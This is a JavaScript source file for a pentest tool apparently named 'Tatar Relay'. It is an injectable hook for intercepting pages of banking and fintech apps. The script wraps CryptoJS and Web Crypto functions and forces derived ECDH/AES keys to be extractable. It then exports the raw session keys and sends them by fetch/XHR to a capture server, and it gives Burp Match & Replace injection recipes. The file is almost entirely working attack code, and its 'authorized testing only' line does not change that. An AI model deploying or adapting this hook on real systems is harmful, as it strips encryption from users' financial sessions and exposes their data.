/**
 * Tatar Relay — Session Key Capture Hook
 * =======================================
 * Inject this script into the target page (via Burp Match & Replace,
 * browser DevTools, or a Burp extension) to automatically capture AES
 * session keys derived from ECDH key exchange.
 *
 * Works with:
 *   - Passphrase-mode libs  (various mobile banking and fintech frameworks)
 *   - Web Crypto API  (ECDH deriveKey / importKey)
 *
 * ─── QUICK INJECT (Burp Match & Replace) ──────────────────────────────────
 *
 *  Type          : Response body
 *  Match         : </head>
 *  Replace       : <script>PASTE_MINIFIED_HOOK_HERE</script></head>
 *
 *  Or inject into a specific JS file response:
 *  Type          : Response body
 *  Match (regex) : ^(function\s*\()                  (start of IIFE)
 *  Replace       : PASTE_MINIFIED_HOOK_HERE;\n$1
 *
 * See BURP_INJECT_GUIDE.md for step-by-step screenshots.
 *
 * ─── KEY CAPTURE SERVER ───────────────────────────────────────────────────
 *
 *  Start before injecting:   relay capture --port 9091
 *  Or integrated:            relay bridge myprofile.yaml --capture
 *
 *  The hook POSTs the captured key to:
 *    http://127.0.0.1:9091/key?v=<64-hex-chars>
 *
 * ─── MANUAL CONSOLE USE ───────────────────────────────────────────────────
 *
 *  1. Open DevTools (F12) → Console
 *  2. Paste this entire file
 *  3. Log in to the target app
 *  4. The key is logged in green and stored in window.__TR_KEY__
 *
 * IMPORTANT: Authorized testing only. Do not use against systems you do not
 * own or have explicit written permission to test.
 */
(function () {
  'use strict';

  /* ── Configuration ─────────────────────────────────────────────────── */
  var CAPTURE_URL  = 'http://127.0.0.1:9091/key';
  var OBSERVE_URL  = 'http://127.0.0.1:9091/observe';   // crypto fingerprints
  var MIN_KEY_BITS = 128;   // ignore anything shorter (noise filters)

  /* ── Utilities ─────────────────────────────────────────────────────── */
  function log(msg, color) {
    try {
      console.log(
        '%c[Tatar Relay] ' + msg,
        'color:' + (color || '#00ff88') + ';background:#111;padding:2px 6px;' +
        'border-radius:3px;font-weight:bold;font-family:monospace'
      );
    } catch (_) {}
  }

  function sendKey(hex, source) {
    if (!hex || hex.length < (MIN_KEY_BITS / 4)) return;
    if (window.__TR_KEY__ === hex) return;   // already sent this key
    window.__TR_KEY__        = hex;
    window.__TR_KEY_SOURCE__ = source;
    log('Key captured (' + (hex.length * 4) + '-bit) from ' + source +
        '  →  ' + hex.substring(0, 16) + '…');

    // Primary: fetch (no-cors, fire-and-forget)
    try {
      fetch(CAPTURE_URL + '?v=' + hex, { mode: 'no-cors' }).catch(function () {});
    } catch (_) {}

    // Fallback: XHR (works in older browsers / stricter CSP environments)
    try {
      var xhr = new XMLHttpRequest();
      xhr.open('GET', CAPTURE_URL + '?v=' + hex, true);
      xhr.send();
    } catch (_) {}
  }

  /* Crypto observer — report the *scheme* (algorithm/mode/lengths), not the data.
     Deduped per page so each distinct scheme is sent once; a new scheme after a
     change is sent again and shows up on the bridge as "NEW SCHEME". */
  function sendObserve(obs) {
    try {
      fetch(OBSERVE_URL, { method: 'POST', mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(obs) }).catch(function () {});
    } catch (_) {}
    try {
      var xhr = new XMLHttpRequest();
      xhr.open('POST', OBSERVE_URL, true);
      xhr.setRequestHeader('Content-Type', 'application/json');
      xhr.send(JSON.stringify(obs));
    } catch (_) {}
    log('Observed: ' + (obs.algorithm || obs.api || '?') +
        (obs.mode ? ' · ' + obs.mode : '') +
        (obs.ivLen ? ' · ' + obs.ivLen + 'B nonce' : '') +
        (obs.keyLen ? ' · ' + obs.keyLen + 'B key' : ''), '#7dd3fc');
  }

  function observe(obs) {
    var sig = [obs.lib, obs.api, obs.algorithm, obs.mode,
               obs.keyLen, obs.ivLen, obs.tagLen].join('|');
    window.__TR_OBS__ = window.__TR_OBS__ || {};
    if (window.__TR_OBS__[sig]) return;   // already reported this scheme
    window.__TR_OBS__[sig] = 1;
    sendObserve(obs);
  }

  function wordArrayToHex(wa) {
    if (!wa || !wa.words || !wa.sigBytes) return null;
    var hex = '';
    for (var i = 0; i < wa.words.length; i++) {
      hex += ('00000000' + ((wa.words[i] >>> 0).toString(16))).slice(-8);
    }
    return hex.substring(0, wa.sigBytes * 2);
  }

  function bufferToHex(buf) {
    return Array.from(new Uint8Array(buf))
      .map(function (b) { return ('00' + b.toString(16)).slice(-2); })
      .join('');
  }

  /* ── Hook 1 — Passphrase-mode lib (EVP-based) ─────────────────────── */
  function hookPassphraseLib() {
    if (typeof CryptoJS === 'undefined') return false;

    function modeName(cfg) {
      if (!cfg || !cfg.mode || !CryptoJS.mode) return '';
      for (var m in CryptoJS.mode) { if (CryptoJS.mode[m] === cfg.mode) return m; }
      return '';
    }
    function observeCJS(cipher, dir, key, cfg) {
      try {
        observe({
          lib: 'evp-passphrase', api: cipher + '.' + dir, algorithm: cipher,
          mode: modeName(cfg) || 'CBC',
          keyLen: (key && key.sigBytes) ? key.sigBytes : 0,
          ivLen: (cfg && cfg.iv && cfg.iv.sigBytes) ? cfg.iv.sigBytes : 0,
          direction: dir
        });
      } catch (_) {}
    }

    var hooked = 0;
    ['AES', 'DES', 'TripleDES'].forEach(function (cipher) {
      if (!CryptoJS[cipher] || !CryptoJS[cipher].encrypt) return;
      var origEnc = CryptoJS[cipher].encrypt;
      CryptoJS[cipher].encrypt = function (message, key, cfg) {
        observeCJS(cipher, 'encrypt', key, cfg);
        // key is either a WordArray (raw bytes) or a string (passphrase — skip)
        if (key && typeof key === 'object' && key.words && key.sigBytes >= (MIN_KEY_BITS / 8)) {
          var hex = wordArrayToHex(key);
          if (hex) sendKey(hex, cipher + '.encrypt');
        }
        return origEnc.apply(this, arguments);
      };
      if (CryptoJS[cipher].decrypt) {
        var origDec = CryptoJS[cipher].decrypt;
        CryptoJS[cipher].decrypt = function (ciphertext, key, cfg) {
          observeCJS(cipher, 'decrypt', key, cfg);
          if (key && typeof key === 'object' && key.words && key.sigBytes >= (MIN_KEY_BITS / 8)) {
            var hex = wordArrayToHex(key);
            if (hex) sendKey(hex, cipher + '.decrypt');
          }
          return origDec.apply(this, arguments);
        };
      }
      hooked++;
    });

    if (hooked > 0) {
      log('Passphrase hook installed (' + hooked + ' cipher(s))');
      return true;
    }
    return false;
  }

  /* ── Hook 2 — Web Crypto API (ECDH → AES deriveKey) ───────────────── */
  function hookWebCrypto() {
    if (!window.crypto || !window.crypto.subtle) return false;

    /* deriveKey — the main ECDH shared-secret → AES key path */
    var origDerive = window.crypto.subtle.deriveKey.bind(window.crypto.subtle);
    window.crypto.subtle.deriveKey = function (algo, baseKey, derivedAlgo, extractable, usages) {
      // Force extractable so we can exportKey; the original caller's value is ignored here
      return origDerive(algo, baseKey, derivedAlgo, true, usages).then(function (key) {
        return window.crypto.subtle.exportKey('raw', key).then(function (raw) {
          sendKey(bufferToHex(raw),
            'WebCrypto.deriveKey(' + (algo && algo.name ? algo.name : '?') + ')');
          return key;
        }).catch(function () {
          return key;   // exportKey failed silently — return the key anyway
        });
      });
    };

    /* importKey — some apps import a pre-shared AES key directly */
    var origImport = window.crypto.subtle.importKey.bind(window.crypto.subtle);
    window.crypto.subtle.importKey = function (format, keyData, algo, extractable, usages) {
      if (format === 'raw' && keyData) {
        try {
          var raw = keyData instanceof ArrayBuffer ? keyData : keyData.buffer;
          if (raw.byteLength >= (MIN_KEY_BITS / 8)) {
            sendKey(bufferToHex(raw),
              'WebCrypto.importKey(' + (algo && algo.name ? algo.name : '?') + ')');
          }
        } catch (_) {}
      }
      return origImport.apply(this, arguments);
    };

    /* encrypt / decrypt — observe the actual cipher, IV length and tag length */
    ['encrypt', 'decrypt'].forEach(function (op) {
      if (!window.crypto.subtle[op]) return;
      var origOp = window.crypto.subtle[op].bind(window.crypto.subtle);
      window.crypto.subtle[op] = function (algo, key, data) {
        try {
          var a = (typeof algo === 'string') ? { name: algo } : (algo || {});
          var name = a.name || '?';
          var ivLen = 0;
          if (a.iv) ivLen = a.iv.byteLength || a.iv.length || 0;
          else if (a.counter) ivLen = 16;
          else if (a.nonce) ivLen = a.nonce.byteLength || a.nonce.length || 0;
          var tagLen = a.tagLength ? (a.tagLength / 8)
                     : (String(name).indexOf('GCM') >= 0 ? 16 : 0);
          var keyLen = (key && key.algorithm && key.algorithm.length)
                     ? (key.algorithm.length / 8) : 0;
          observe({
            lib: 'WebCrypto', api: op, algorithm: name,
            mode: (String(name).split('-')[1] || ''),
            keyLen: keyLen, ivLen: ivLen, tagLen: tagLen, direction: op
          });
        } catch (_) {}
        return origOp.apply(this, arguments);
      };
    });

    log('Web Crypto hooks installed (deriveKey + importKey + encrypt/decrypt)');
    return true;
  }

  /* ── Install — retry until passphrase lib loads ────────────────────── */
  var _passphraseHooked = false;
  hookWebCrypto();   // always available synchronously

  function _tryAll() {
    if (!_passphraseHooked) _passphraseHooked = hookPassphraseLib();
    if (!_passphraseHooked) setTimeout(_tryAll, 800);
  }

  _tryAll();
  document.addEventListener('DOMContentLoaded', _tryAll);
  window.addEventListener('load', _tryAll);

  log('Loaded — waiting for crypto operations…', '#ffcc00');
}());
